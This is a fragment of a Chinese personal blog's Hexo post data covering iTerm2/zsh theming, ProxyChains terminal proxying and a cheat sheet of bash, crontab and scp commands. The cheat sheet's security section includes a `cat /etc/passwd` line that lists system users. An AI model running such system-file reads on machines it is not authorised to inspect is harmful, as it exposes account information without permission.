href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n"},{"title":"使用ProxyChains进行终端代理","date":"2016-09-25T23:46:04.000Z","_content":"\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","source":"_posts/使用ProxyChains进行终端代理.md","raw":"---\ntitle: 使用ProxyChains进行终端代理\ndate: 2016-09-26 00:46:04\ntags: Hack\ncategories: Hack\n---\n\n# 安装\n```\nbrew install proxychains-ng\n```\n# 配置\n```\nvi /usr/local/etc/proxychains.conf\n```\n# 使用\n```\nproxychains4 ssh xx:xx@xx.com\n```","slug":"使用ProxyChains进行终端代理","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300u000qcdonn7zxlnbc","content":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install proxychains-ng</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vi /usr/local/etc/proxychains.conf</div></pre></td></tr></table></figure>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">proxychains4 ssh xx:xx@xx.com</div></pre></td></tr></table></figure>"},{"title":"常用Bash命令总结","id":"10","updated":"2016-08-06T10:15:29.000Z","date":"2016-08-05T23:36:19.000Z","_content":"\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","source":"_posts/常用Bash命令总结.md","raw":"---\ntitle: 常用Bash命令总结\ntags: 'Linux'\npermalink: bash\nid: 10\nupdated: '2016-08-06 11:15:29'\ndate: 2016-08-06 00:36:19\n---\n\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","slug":"bash","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym300v000vcdondrbsxafd","content":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>\n<a id=\"more\"></a> \n<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>\n","excerpt":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>","more":"<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> 